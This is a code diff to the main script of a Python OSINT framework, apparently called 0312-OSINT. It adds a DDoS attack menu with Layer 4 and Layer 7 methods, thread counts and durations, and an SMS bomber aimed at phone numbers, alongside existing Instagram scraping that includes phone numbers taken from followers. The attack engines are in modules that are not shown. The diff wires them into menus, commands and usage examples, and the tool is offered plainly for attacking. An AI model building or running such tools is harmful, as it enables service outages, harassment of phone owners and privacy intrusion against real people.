@@ -18,22 +18,24 @@ from modules.phone import PhoneOSINT
 from modules.email_osint import EmailOSINT
 from modules.username_search import UsernameSearch
 from modules.web_osint import WebOSINT
+from modules.ddos_module import DDoSAttack, run_ddos
+from modules.ddos_menu import ddos_interactive_menu
+from modules.sms_module import SMSBomber, run_sms_bomb
+from modules.sms_menu import sms_interactive_menu
 
 IG = None
 CONNECTED = False
 
 ASCII_ART = r"""
- .----------------.  .----------------.  .----------------.  .----------------. 
-| .--------------. || .--------------. || .--------------. || .--------------. |
-| |     ____     | || |    ______    | || |     __       | || |    _____     | |
-| |   .'    '.   | || |   / ____ `.  | || |    /  |      | || |   / ___ `.   | |
-| |  |  .--.  |  | || |   `'  __) |  | || |    `| |      | || |  |_/___) |   | |
-| |  | |    | |  | || |   _  |__ '.  | || |     | |      | || |   .'____.'   | |
-| |  |  `--'  |  | || |  | \____) |  | || |    _| |_     | || |  / /____     | |
-| |   '.____.'   | || |   \______.'  | || |   |_____|    | || |  |_______|   | |
-| |              | || |              | || |              | || |              | |
-| '--------------' || '--------------' || '--------------' || '--------------' |
- '----------------'  '----------------'  '----------------'  '----------------' 
+  /$$$$$$   /$$$$$$    /$$    /$$$$$$          /$$$$$$   /$$$$$$  /$$$$$$ /$$   /$$ /$$$$$$$$
+ /$$$_  $$ /$$__  $$ /$$$$   /$$__  $$        /$$__  $$ /$$__  $$|_  $$_/| $$$ | $$|__  $$__/
+| $$$$\ $$|__/  \ $$|_  $$  |__/  \ $$       | $$  \ $$| $$  \__/  | $$  | $$$$| $$   | $$   
+| $$ $$ $$   /$$$$$/  | $$    /$$$$$$//$$$$$$| $$  | $$|  $$$$$$   | $$  | $$ $$ $$   | $$   
+| $$\ $$$$  |___  $$  | $$   /$$____/|______/| $$  | $$ \____  $$  | $$  | $$  $$$$   | $$   
+| $$ \ $$$ /$$  \ $$  | $$  | $$             | $$  | $$ /$$  \ $$  | $$  | $$\  $$$   | $$   
+|  $$$$$$/|  $$$$$$/ /$$$$$$| $$$$$$$$       |  $$$$$$/|  $$$$$$/ /$$$$$$| $$ \  $$   | $$   
+ \______/  \______/ |______/|________/        \______/  \______/ |______/|__/  \__/   |__/  
+                                    Made By Emirhan.0312 
 """
 
 COMMANDS = {}
@@ -45,10 +47,10 @@ def signal_handler(sig, frame):
 
 
 BANNER = """
-+====================================================================+
-|       0312-OSINT - Multi-Platform OSINT Framework                  |
-|       Instagram | Phone | Email | Username | IP | Domain           |
-+====================================================================+
++========================================================================+
+|             0312-OSINT - Multi-Platform OSINT Framework                |
+| Instagram | Phone | Email | Username | IP | Domain | SMS Bomber | DDOS |
++========================================================================+
 """
 
 def print_logo():
@@ -68,6 +70,20 @@ def print_help():
     disp.pout("\n  help/h             Show this help\n", disp.WHITE)
     disp.pout("  quit/exit/q        Exit 0312-OSINT\n", disp.WHITE)
     disp.pout("  clear/cls          Clear screen\n", disp.WHITE)
+
+
+def print_menu():
+    disp.pheader("MAIN MENU")
+    disp.pout("  [1] Instagram OSINT\n", disp.GREEN)
+    disp.pout("  [2] Phone Number Lookup\n", disp.GREEN)
+    disp.pout("  [3] Email Lookup\n", disp.GREEN)
+    disp.pout("  [4] Username Search (25+ platforms)\n", disp.GREEN)
+    disp.pout("  [5] IP / Domain Lookup\n", disp.GREEN)
+    disp.pout("  [6] DDoS Attack Menu\n", disp.RED)
+    disp.pout("  [7] SMS Bomber Menu\n", disp.RED)
+    disp.pout("  [8] Help / All Commands\n", disp.YELLOW)
+    disp.pout("  [9] Clear Screen\n", disp.WHITE)
+    disp.pout("  [0] Exit\n\n", disp.RED)
 
 
 def cmd_help():
@@ -333,6 +349,65 @@ def cmd_webcheck():
         w.lookup_domain(ip)
 
 
+def cmd_ddos(target=None, method=None, threads=None, duration=None):
+    if not target:
+        ddos_interactive_menu()
+        return
+    if not method:
+        m = disp.pin("Method (GET/POST/TCP/UDP/etc): ", disp.YELLOW) or "GET"
+    else:
+        m = method
+    if not threads:
+        try:
+            threads = int(disp.pin("Thread count [50]: ", disp.YELLOW) or "50")
+        except:
+            threads = 50
+    if not duration:
+        try:
+            duration = int(disp.pin("Duration (seconds) [0=unlimited]: ", disp.YELLOW) or "30")
+        except:
+            duration = 30
+
+    disp.pinfo(f"\nStarting DDoS attack: {m} -> {target} ({threads} threads)\n")
+    success, msg, stats = run_ddos(target, m, threads, duration)
+    if success:
+        disp.pok(f"Attack finished. Total packets sent: {stats['sent']}")
+    else:
+        disp.perror(msg)
+
+
+def cmd_ddos_list():
+    disp.pheader("AVAILABLE DDoS METHODS")
+    for m in DDoSAttack.METHODS:
+        disp.pout(f"  {m}\n", disp.YELLOW)
+
+
+def cmd_sms_bomb(phone=None, count=None):
+    if not phone:
+        sms_interactive_menu()
+        return
+    if not count:
+        try:
+            count = int(disp.pin("SMS count per service [5]: ", disp.YELLOW) or "5")
+        except:
+            count = 5
+
+    disp.pout(f"\n[!] Starting SMS bomb to {phone} ({count} rounds)...\n", disp.YELLOW)
+    success, msg = run_sms_bomb(phone, count)
+    if success:
+        disp.pok(msg)
+    else:
+        disp.perror(msg)
+
+
+def cmd_sms_services():
+    bomber = SMSBomber("0")
+    services = bomber.list_services()
+    disp.pheader("AVAILABLE SMS SERVICES")
+    for s in services:
+        disp.pout(f"  {s}\n", disp.GREEN)
+
+
 COMMANDS = {
     "help": ("Show this help", cmd_help),
     "h": ("Show this help", cmd_help),
@@ -366,6 +441,12 @@ COMMANDS = {
     "igphone":    ("Instagram: phone scraping from followers", lambda: cmd_instagram_phones(None)),
     "propic":     ("Instagram: download profile picture", lambda: cmd_instagram_propic(None)),
     "report":     ("Instagram: generate HTML+JSON report", lambda: cmd_instagram_report(None)),
+
+    "ddos":       ("DDoS interactive menu (Layer7/Layer4)", lambda: cmd_ddos(None, None, None, None)),
+    "ddos-list":  ("List available DDoS methods", cmd_ddos_list),
+    "sms":        ("SMS bomber interactive menu", lambda: cmd_sms_bomb(None, None)),
+    "sms-list":   ("List available SMS services", cmd_sms_services),
+    "menu":       ("Show numbered main menu", print_menu),
 }
 
 
@@ -392,11 +473,12 @@ def interactive_mode():
             pass
 
     print_logo()
+    print_menu()
 
     while True:
         try:
             signal.signal(signal.SIGINT, signal_handler)
-            disp.pout("\n0312-OSINT> ", disp.CYAN, bold=True)
+            disp.pout("0312-OSINT> ", disp.CYAN, bold=True)
             raw = input()
 
             parts = raw.strip().split()
@@ -413,6 +495,30 @@ def interactive_mode():
                 if IG.login():
                     CONNECTED = True
                     IG.set_target(args[0])
+            elif cmd.isdigit():
+                num = int(cmd)
+                if num == 1:
+                    cmd_instagram_info(None)
+                elif num == 2:
+                    cmd_phone(None)
+                elif num == 3:
+                    cmd_email(None)
+                elif num == 4:
+                    cmd_username(None)
+                elif num == 5:
+                    cmd_webcheck()
+                elif num == 6:
+                    cmd_ddos(None, None, None, None)
+                elif num == 7:
+                    cmd_sms_bomb(None, None)
+                elif num == 8:
+                    print_help()
+                elif num == 9:
+                    cmd_clear()
+                    print_logo()
+                    print_menu()
+                elif num == 0:
+                    cmd_quit()
             else:
                 disp.perror(f"Unknown command: {cmd}")
 
@@ -478,6 +584,22 @@ def single_command_mode(cmd_str, args):
                 cmd_webcheck()
         elif cmd == "mutual":
             cmd_instagram_mutual()
+        elif cmd == "ddos":
+            target = args[0] if len(args) > 0 else None
+            method = args[1] if len(args) > 1 else None
+            threads = int(args[2]) if len(args) > 2 and args[2].isdigit() else None
+            duration = int(args[3]) if len(args) > 3 and args[3].isdigit() else None
+            cmd_ddos(target, method, threads, duration)
+        elif cmd == "ddos-list":
+            cmd_ddos_list()
+        elif cmd == "sms":
+            phone = args[0] if args else None
+            count = int(args[1]) if len(args) > 1 and args[1].isdigit() else None
+            cmd_sms_bomb(phone, count)
+        elif cmd == "sms-list":
+            cmd_sms_services()
+        elif cmd == "menu":
+            print_menu()
         elif cmd in ("help", "h"):
             print_help()
     else:
@@ -498,6 +620,12 @@ Examples:
   0312-OSINT username john            25+ platform username search
   0312-OSINT ip 8.8.8.8              IP geolocation
   0312-OSINT domain example.com       Domain WHOIS lookup
+  0312-OSINT ddos http://target.com   DDoS attack with args
+  0312-OSINT ddos                     DDoS interactive menu
+  0312-OSINT ddos-list                List DDoS methods
+  0312-OSINT sms 905551234567         SMS bomber with args
+  0312-OSINT sms                      SMS bomber interactive menu
+  0312-OSINT menu                     Show numbered main menu
         """
     )
     parser.add_argument("command", nargs="?", help="Command to execute")
